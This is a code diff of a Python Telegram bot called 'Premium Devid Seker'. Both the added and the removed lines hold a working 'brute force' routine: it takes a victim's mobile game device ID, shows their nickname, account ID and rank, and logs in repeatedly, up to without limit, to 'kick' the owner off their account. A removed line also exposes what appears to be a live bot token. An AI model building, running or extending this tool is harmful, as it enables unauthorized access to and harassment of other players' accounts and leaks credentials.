@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # ===================================================================
-# PREMIUM DEVID SEKER - TELEGRAM BOT v5.3
-# Fixed Stop Button for Brute Force
+# PREMIUM DEVID SEKER - TELEGRAM BOT v5.2
+# Added Stop Button for Brute Force
 # Created by: @ZyronDevv
 # ===================================================================
 
@@ -55,7 +55,7 @@ logger = logging.getLogger(__name__)
 # BOT CONFIGURATION
 # ────────────────────────────────────────────────────────────────
 
-BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"  # Replace with your bot token
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
 ADMIN_IDS = [8477982865]  # Your Telegram user ID
 
 # Key System Configuration
@@ -931,17 +931,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         data = query.data
         
-        # Handle brute_stop here
-        if data == "brute_stop":
-            context.user_data['brute_running'] = False
-            await query.edit_message_text(
-                "🛑 *Brute Force Stopped!*\n\n"
-                "The attack has been stopped by user request.\n\n"
-                "Use /start to return to main menu.",
-                parse_mode='Markdown'
-            )
-            return
-        
         if data == "menu_main":
             await show_main_menu(update, context)
         
@@ -1088,6 +1077,16 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         elif data == "menu_help":
             await help_command(update, context)
+        
+        # ─── Brute Force Stop Handler ──────────────────────────
+        elif data == "brute_stop":
+            context.user_data['brute_running'] = False
+            await query.edit_message_text(
+                "🛑 *Brute Force Stopped!*\n\n"
+                "The attack has been stopped by user request.\n\n"
+                "Use /start to return to main menu.",
+                parse_mode='Markdown'
+            )
     
     except Exception as e:
         logger.error(f"Error in menu_callback: {e}")
@@ -1631,267 +1630,6 @@ def save_check_result(result: Dict):
     except Exception as e:
         logger.error(f"Error saving result: {e}")
 
-# ─── Brute Force Handler ──────────────────────────────────────
-
-async def handle_brute_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle brute force device input"""
-    try:
-        device_id = update.message.text.strip()
-        
-        if device_id.lower() in ['/cancel', 'cancel']:
-            context.user_data['state'] = None
-            await show_main_menu(update, context)
-            return
-        
-        if not device_id.startswith(('and_', 'ios_')):
-            await safe_reply(
-                update,
-                "❌ *Invalid Device ID*\n\nDevice ID must start with 'and_' or 'ios_'.\n"
-                "Please try again or type /cancel.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        msg = await update.message.reply_text("⏳ *Verifying device...*", parse_mode='Markdown')
-        
-        result = process_device_check(device_id)
-        if not result['success']:
-            await msg.edit_text(
-                f"❌ *Invalid device or login failed*\n\nError: {result.get('error', 'Unknown')}",
-                parse_mode='Markdown'
-            )
-            return
-        
-        context.user_data['brute_device'] = device_id
-        context.user_data['brute_account'] = result
-        context.user_data['brute_running'] = False  # Reset stop flag
-        
-        keyboard = [
-            [InlineKeyboardButton("🧪 Single Test", callback_data="brute_1")],
-            [InlineKeyboardButton("⚡ 10x Kicks", callback_data="brute_10")],
-            [InlineKeyboardButton("🚀 50x Kicks", callback_data="brute_50")],
-            [InlineKeyboardButton("💥 100x Kicks", callback_data="brute_100")],
-            [InlineKeyboardButton("♾️ Unlimited", callback_data="brute_unlimited")],
-            [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-        ]
-        
-        await msg.edit_text(
-            f"⚡ *Brute Force Setup*\n\nTarget: *{result['nickname']}*\n"
-            f"Account: `{result['account_id']}` ({result['zone_id']})\n"
-            f"Rank: {result['rank']}\n\nSelect attack intensity:",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
-    
-    except Exception as e:
-        logger.error(f"Error in handle_brute_config: {e}")
-
-async def brute_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle brute force callbacks"""
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        data = query.data
-        
-        # Handle STOP button first
-        if data == "brute_stop":
-            context.user_data['brute_running'] = False
-            await query.edit_message_text(
-                "🛑 *Brute Force Stopped!*\n\n"
-                "The attack has been stopped by user request.\n\n"
-                "Use /start to return to main menu.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        account = context.user_data.get('brute_account')
-        
-        if not account:
-            await query.edit_message_text(
-                "❌ *No target set*\n\nPlease set a target first.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        brute_configs = {
-            "brute_1": (1, 0),
-            "brute_10": (10, 2),
-            "brute_50": (50, 1),
-            "brute_100": (100, 0.5),
-            "brute_unlimited": (0, 0.5),
-        }
-        
-        config = brute_configs.get(data)
-        if not config:
-            return
-        
-        loops, delay = config
-        
-        # Set running flag
-        context.user_data['brute_running'] = True
-        
-        await query.edit_message_text(
-            f"⚡ *Starting Brute Force*\n\nTarget: *{account['nickname']}*\n"
-            f"Loops: {'∞' if loops == 0 else loops}\nDelay: {delay}s\n\n"
-            f"⏳ Starting...\n\n"
-            f"Press the STOP button below to cancel anytime.",
-            parse_mode='Markdown'
-        )
-        
-        await run_brute_force(update, context, query, account, loops, delay)
-    
-    except Exception as e:
-        logger.error(f"Error in brute_callback: {e}")
-
-async def run_brute_force(update, context, query, account, loops, delay):
-    """Execute brute force attack with stop button - FIXED VERSION"""
-    try:
-        device_id = context.user_data.get('brute_device')
-        if not device_id:
-            return
-        
-        success_count = 0
-        fail_count = 0
-        count = 0
-        start_time = time.time()
-        last_update_time = time.time()
-        update_interval = 2  # Update status every 2 seconds
-        
-        # Create keyboard with STOP button
-        keyboard = [[InlineKeyboardButton("🛑 STOP BRUTE FORCE", callback_data="brute_stop")]]
-        
-        status_msg = await query.message.edit_text(
-            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
-            f"Progress: 0/{'∞' if loops == 0 else loops}\n"
-            f"✅ Success: 0\n❌ Failed: 0\n⏱️ Elapsed: 0s\n\n"
-            f"🛑 Press STOP to cancel",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
-        
-        def send_kick(device, acc_info):
-            try:
-                with GameConnection(device_id=device) as conn:
-                    if conn.login_to_login_server():
-                        if conn.get_game_server():
-                            if conn.connect_to_game_server():
-                                return True
-                return False
-            except:
-                return False
-        
-        try:
-            while True:
-                # Check if user requested stop - CRITICAL CHECK
-                if not context.user_data.get('brute_running', True):
-                    await status_msg.edit_text(
-                        f"🛑 *Brute Force Stopped by User*\n\n"
-                        f"Target: *{account['nickname']}*\n"
-                        f"📊 Total Attempts: {count}\n"
-                        f"✅ Success: {success_count}\n"
-                        f"❌ Failed: {fail_count}\n"
-                        f"🎯 Success Rate: {success_count/count*100:.1f}%\n" if count > 0 else "🎯 Success Rate: N/A\n"
-                        f"⏱️ Duration: {time.time() - start_time:.1f}s\n\n"
-                        f"Use /start to continue.",
-                        parse_mode='Markdown'
-                    )
-                    return
-                
-                count += 1
-                success = send_kick(device_id, account)
-                
-                if success:
-                    success_count += 1
-                else:
-                    fail_count += 1
-                
-                # Update status based on time interval or every 10 kicks
-                current_time = time.time()
-                if count % 10 == 0 or (current_time - last_update_time) >= update_interval:
-                    elapsed = current_time - start_time
-                    last_update_time = current_time
-                    
-                    # Check stop flag before updating
-                    if not context.user_data.get('brute_running', True):
-                        await status_msg.edit_text(
-                            f"🛑 *Brute Force Stopped by User*\n\n"
-                            f"Target: *{account['nickname']}*\n"
-                            f"📊 Total Attempts: {count}\n"
-                            f"✅ Success: {success_count}\n"
-                            f"❌ Failed: {fail_count}\n"
-                            f"🎯 Success Rate: {success_count/count*100:.1f}%\n"
-                            f"⏱️ Duration: {elapsed:.1f}s\n\n"
-                            f"Use /start to continue.",
-                            parse_mode='Markdown'
-                        )
-                        return
-                    
-                    try:
-                        await status_msg.edit_text(
-                            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
-                            f"Progress: {count}/{'∞' if loops == 0 else loops}\n"
-                            f"✅ Success: {success_count}\n❌ Failed: {fail_count}\n"
-                            f"🎯 Rate: {success_count/count*100:.1f}%\n"
-                            f"⏱️ Elapsed: {elapsed:.0f}s\n"
-                            f"⚡ Speed: {count/elapsed:.1f} kicks/s\n\n"
-                            f"🛑 Press STOP to cancel",
-                            reply_markup=InlineKeyboardMarkup(keyboard),
-                            parse_mode='Markdown'
-                        )
-                    except Exception as e:
-                        logger.error(f"Error updating status: {e}")
-                
-                # Check if we should break the loop
-                if loops > 0 and count >= loops:
-                    break
-                
-                if delay > 0:
-                    # Check stop flag during sleep
-                    for _ in range(int(delay * 10)):
-                        if not context.user_data.get('brute_running', True):
-                            await status_msg.edit_text(
-                                f"🛑 *Brute Force Stopped by User*\n\n"
-                                f"Target: *{account['nickname']}*\n"
-                                f"📊 Total Attempts: {count}\n"
-                                f"✅ Success: {success_count}\n"
-                                f"❌ Failed: {fail_count}\n"
-                                f"🎯 Success Rate: {success_count/count*100:.1f}%\n"
-                                f"⏱️ Duration: {time.time() - start_time:.1f}s\n\n"
-                                f"Use /start to continue.",
-                                parse_mode='Markdown'
-                            )
-                            return
-                        time.sleep(0.1)
-                    
-        except Exception as e:
-            logger.error(f"Brute force loop error: {e}")
-            # Still show the error and stop
-            await status_msg.edit_text(
-                f"❌ *Error in Brute Force*\n\n{str(e)}",
-                parse_mode='Markdown'
-            )
-            return
-        
-        # Show completion summary
-        elapsed = time.time() - start_time
-        final_keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")]]
-        
-        await status_msg.edit_text(
-            f"✅ *Brute Force Complete!*\n\nTarget: *{account['nickname']}*\n"
-            f"📊 Total Attempts: {count}\n✅ Success: {success_count}\n"
-            f"❌ Failed: {fail_count}\n🎯 Success Rate: {success_count/count*100:.1f}%\n" if count > 0 else "🎯 Success Rate: N/A\n"
-            f"⏱️ Duration: {elapsed:.1f}s\n⚡ Speed: {count/elapsed:.1f} kicks/s",
-            reply_markup=InlineKeyboardMarkup(final_keyboard),
-            parse_mode='Markdown'
-        )
-        
-        # Reset running flag
-        context.user_data['brute_running'] = False
-    
-    except Exception as e:
-        logger.error(f"Error in run_brute_force: {e}")
-
 # ─── Message Handler ───────────────────────────────────────────
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2080,6 +1818,212 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
         logger.error(f"Error in handle_file_upload: {e}")
         await safe_reply(update, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
 
+# ─── Brute Force Handler ──────────────────────────────────────
+
+async def handle_brute_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle brute force device input"""
+    try:
+        device_id = update.message.text.strip()
+        
+        if device_id.lower() in ['/cancel', 'cancel']:
+            context.user_data['state'] = None
+            await show_main_menu(update, context)
+            return
+        
+        if not device_id.startswith(('and_', 'ios_')):
+            await safe_reply(
+                update,
+                "❌ *Invalid Device ID*\n\nDevice ID must start with 'and_' or 'ios_'.\n"
+                "Please try again or type /cancel.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        msg = await update.message.reply_text("⏳ *Verifying device...*", parse_mode='Markdown')
+        
+        result = process_device_check(device_id)
+        if not result['success']:
+            await msg.edit_text(
+                f"❌ *Invalid device or login failed*\n\nError: {result.get('error', 'Unknown')}",
+                parse_mode='Markdown'
+            )
+            return
+        
+        context.user_data['brute_device'] = device_id
+        context.user_data['brute_account'] = result
+        context.user_data['brute_running'] = False  # Reset stop flag
+        
+        keyboard = [
+            [InlineKeyboardButton("🧪 Single Test", callback_data="brute_1")],
+            [InlineKeyboardButton("⚡ 10x Kicks", callback_data="brute_10")],
+            [InlineKeyboardButton("🚀 50x Kicks", callback_data="brute_50")],
+            [InlineKeyboardButton("💥 100x Kicks", callback_data="brute_100")],
+            [InlineKeyboardButton("♾️ Unlimited", callback_data="brute_unlimited")],
+            [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
+        ]
+        
+        await msg.edit_text(
+            f"⚡ *Brute Force Setup*\n\nTarget: *{result['nickname']}*\n"
+            f"Account: `{result['account_id']}` ({result['zone_id']})\n"
+            f"Rank: {result['rank']}\n\nSelect attack intensity:",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    
+    except Exception as e:
+        logger.error(f"Error in handle_brute_config: {e}")
+
+async def brute_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle brute force callbacks"""
+    try:
+        query = update.callback_query
+        await query.answer()
+        
+        data = query.data
+        account = context.user_data.get('brute_account')
+        
+        if not account:
+            await query.edit_message_text(
+                "❌ *No target set*\n\nPlease set a target first.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        brute_configs = {
+            "brute_1": (1, 0),
+            "brute_10": (10, 2),
+            "brute_50": (50, 1),
+            "brute_100": (100, 0.5),
+            "brute_unlimited": (0, 0.5),
+        }
+        
+        config = brute_configs.get(data)
+        if not config:
+            return
+        
+        loops, delay = config
+        
+        # Set running flag
+        context.user_data['brute_running'] = True
+        
+        await query.edit_message_text(
+            f"⚡ *Starting Brute Force*\n\nTarget: *{account['nickname']}*\n"
+            f"Loops: {'∞' if loops == 0 else loops}\nDelay: {delay}s\n\n"
+            f"⏳ Starting...\n\n"
+            f"Press the STOP button below to cancel anytime.",
+            parse_mode='Markdown'
+        )
+        
+        await run_brute_force(update, context, query, account, loops, delay)
+    
+    except Exception as e:
+        logger.error(f"Error in brute_callback: {e}")
+
+async def run_brute_force(update, context, query, account, loops, delay):
+    """Execute brute force attack with stop button"""
+    try:
+        device_id = context.user_data.get('brute_device')
+        if not device_id:
+            return
+        
+        success_count = 0
+        fail_count = 0
+        count = 0
+        start_time = time.time()
+        
+        # Create keyboard with STOP button
+        keyboard = [[InlineKeyboardButton("🛑 STOP BRUTE FORCE", callback_data="brute_stop")]]
+        
+        status_msg = await query.message.edit_text(
+            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
+            f"Progress: 0/{'∞' if loops == 0 else loops}\n"
+            f"✅ Success: 0\n❌ Failed: 0\n⏱️ Elapsed: 0s\n\n"
+            f"🛑 Press STOP to cancel",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+        
+        def send_kick(device, acc_info):
+            try:
+                with GameConnection(device_id=device) as conn:
+                    if conn.login_to_login_server():
+                        if conn.get_game_server():
+                            if conn.connect_to_game_server():
+                                return True
+                return False
+            except:
+                return False
+        
+        try:
+            while True:
+                # Check if user requested stop
+                if not context.user_data.get('brute_running', True):
+                    await status_msg.edit_text(
+                        f"🛑 *Brute Force Stopped by User*\n\n"
+                        f"Target: *{account['nickname']}*\n"
+                        f"📊 Total Attempts: {count}\n"
+                        f"✅ Success: {success_count}\n"
+                        f"❌ Failed: {fail_count}\n"
+                        f"🎯 Success Rate: {success_count/count*100:.1f}%\n"
+                        f"⏱️ Duration: {time.time() - start_time:.1f}s\n\n"
+                        f"Use /start to continue.",
+                        parse_mode='Markdown'
+                    )
+                    return
+                
+                count += 1
+                success = send_kick(device_id, account)
+                
+                if success:
+                    success_count += 1
+                else:
+                    fail_count += 1
+                
+                # Update status every 5 kicks
+                if count % 5 == 0:
+                    elapsed = time.time() - start_time
+                    try:
+                        await status_msg.edit_text(
+                            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
+                            f"Progress: {count}/{'∞' if loops == 0 else loops}\n"
+                            f"✅ Success: {success_count}\n❌ Failed: {fail_count}\n"
+                            f"🎯 Rate: {success_count/count*100:.1f}%\n"
+                            f"⏱️ Elapsed: {elapsed:.0f}s\n\n"
+                            f"🛑 Press STOP to cancel",
+                            reply_markup=InlineKeyboardMarkup(keyboard),
+                            parse_mode='Markdown'
+                        )
+                    except Exception as e:
+                        logger.error(f"Error updating status: {e}")
+                
+                if loops > 0 and count >= loops:
+                    break
+                
+                if delay > 0:
+                    time.sleep(delay)
+                    
+        except Exception as e:
+            logger.error(f"Brute force loop error: {e}")
+        
+        # Show completion summary
+        elapsed = time.time() - start_time
+        final_keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")]]
+        
+        await status_msg.edit_text(
+            f"✅ *Brute Force Complete!*\n\nTarget: *{account['nickname']}*\n"
+            f"📊 Total Attempts: {count}\n✅ Success: {success_count}\n"
+            f"❌ Failed: {fail_count}\n🎯 Success Rate: {success_count/count*100:.1f}%\n"
+            f"⏱️ Duration: {elapsed:.1f}s\n⚡ Speed: {count/elapsed:.1f} kicks/s",
+            reply_markup=InlineKeyboardMarkup(final_keyboard),
+            parse_mode='Markdown'
+        )
+        
+        # Reset running flag
+        context.user_data['brute_running'] = False
+    
+    except Exception as e:
+        logger.error(f"Error in run_brute_force: {e}")
+
 # ─── Cancel Command ────────────────────────────────────────────
 
 async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2165,11 +2109,11 @@ def main():
         # Add error handler
         application.add_error_handler(error_handler)
         
-        print("🤖 Premium Devid Seker Bot v5.3")
+        print("🤖 Premium Devid Seker Bot v5.2")
         print("👑 Created by: @ZyronDevv")
         print("🔗 Bot is running...")
         print("📊 Press Ctrl+C to stop")
-        print("🛑 Brute Force STOP button is now FIXED!")
+        print("🛑 Brute Force now has a STOP button!")
         
         application.run_polling(
             allowed_updates=Update.ALL_TYPES,
